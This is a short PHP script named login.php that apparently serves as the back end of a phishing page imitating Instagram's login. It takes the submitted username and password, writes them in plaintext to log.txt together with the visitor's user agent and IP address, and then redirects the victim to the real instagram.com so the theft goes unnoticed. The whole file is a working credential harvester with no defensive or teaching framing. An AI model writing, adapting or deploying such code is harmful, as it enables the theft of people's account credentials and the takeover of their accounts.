<?php
// login.php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // Get user's browser device information
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ipAddress = $_SERVER['REMOTE_ADDR'] ?? '';

    // Append incoming information to a file
    $logData = "Username: $username, Password: $password, User Agent: $userAgent, IP Address: $ipAddress\n";
    file_put_contents('log.txt', $logData, FILE_APPEND);

    //  Redirect to Instagram when login is successful
    header("Location: https://www.instagram.com");
    exit;
}
?>
